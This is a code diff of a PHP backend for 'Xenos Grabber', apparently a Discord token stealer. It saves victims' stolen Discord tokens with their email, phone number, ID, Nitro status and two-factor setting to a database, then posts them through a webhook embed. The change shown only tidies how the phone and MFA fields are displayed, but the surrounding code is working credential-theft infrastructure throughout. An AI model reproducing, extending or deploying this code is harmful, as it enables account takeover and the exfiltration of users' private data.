@@ -33,8 +33,15 @@
                         
                         if($count == 0) {
                             global $bdd;
+
+                            if(strval((bool) $data->phone)) {
+                                $phone = $data->phone;
+                            } else {
+                                $phone = "None";
+                            }
+                            
                             $req = $bdd->prepare("INSERT INTO `tokens`(`user_id`, `username`, `avatar`, `email`, `phone`, `badges`, `nitro_badges`, `twofactor`, `token`) VALUES (?,?,?,?,?,?,?,?,?)");
-                            $req->execute(array(strval($data->id),strval($data->username)."#".strval($data->discriminator),strval($data->avatar),strval($data->email),strval($data->phone),strval($data->flags),strval($data->premium_type),strval($data->mfa_enabled),strval($token)));
+                            $req->execute(array(strval($data->id),strval($data->username)."#".strval($data->discriminator),strval($data->avatar),strval($data->email),strval($phone),strval($data->flags),strval($data->premium_type),strval((bool) $data->mfa_enabled),strval($token)));
                             
                             // Webhook Notification
 
@@ -46,12 +53,24 @@
                                 $nitro_type = "❌ No Nitro";
                             }
 
+                            if(strval((bool) $data->mfa_enabled) == true) {
+                                $mfa = "✔️";
+                            } else {
+                                $mfa = "❌";
+                            }
+
+                            if(strval((bool) $data->phone)) {
+                                $phone = $data->phone;
+                            } else {
+                                $phone = "❌";
+                            }
+
                             $json_data = json_encode([
                                 "username" => "Xenos Grabber",
                                 "avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif",
                                 "embeds" => [
                                     [
-                                        "description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($data->phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".strval($data->mfa_enabled)."\n```\n\n__Token:__\n```".$token."```",
+                                        "description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```",
                                         "footer" => [
                                             "text" => "Xenos Grabber - https://github.com/KanekiWeb",
                                             "icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"
